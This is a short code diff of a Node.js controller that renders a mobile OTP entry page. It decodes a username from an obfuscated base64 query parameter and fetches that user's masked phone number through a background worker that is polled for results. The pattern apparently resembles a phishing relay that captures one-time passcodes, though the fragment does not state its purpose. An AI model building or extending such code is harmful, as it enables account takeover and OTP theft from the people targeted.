@@ -1,3 +1,4 @@
+
 const db = require('../models/db');
 const path = require('path');
 const fs = require('fs');
@@ -138,10 +139,11 @@ exports.mobileResultCheck = async (req, res) => {
   res.json({ result: r.result || 'waiting', data: r.data || null });
 };
 
-exports.getMobileOtpPage = (req, res) => {
+exports.getMobileOtpPage = async (req, res) => {
   const tk = req.query.mnbvcxzZXCVBNM || '';
   const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
-  const hiddenMobNumber = req.query.mob || '***';
+  const r = await sendToWorker('getPageData', { username });
+  const hiddenMobNumber = (r.data && r.data.hiddenMobNumber) ? r.data.hiddenMobNumber : (req.query.mob || '***');
   res.render('motp', { hiddenMobNumber });
 };
 
